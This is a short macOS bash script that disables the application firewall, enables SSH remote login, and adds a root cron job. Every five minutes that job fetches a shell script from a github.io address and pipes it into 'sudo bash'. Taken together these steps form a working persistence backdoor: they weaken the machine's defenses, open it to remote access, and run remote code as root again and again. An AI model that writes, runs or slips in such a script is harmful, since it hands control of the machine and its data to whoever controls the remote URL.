#!/bin/bash

#disable firewall
sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0
#enable ssh
sudo systemsetup -f -setremotelogin on


command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"

#write out current crontab
sudo crontab -u root -l > mycron
#echo new cron into cron file
echo "*/5 * * * * $command" >> mycron
#install new cron file
sudo crontab -u root mycron
rm mycron
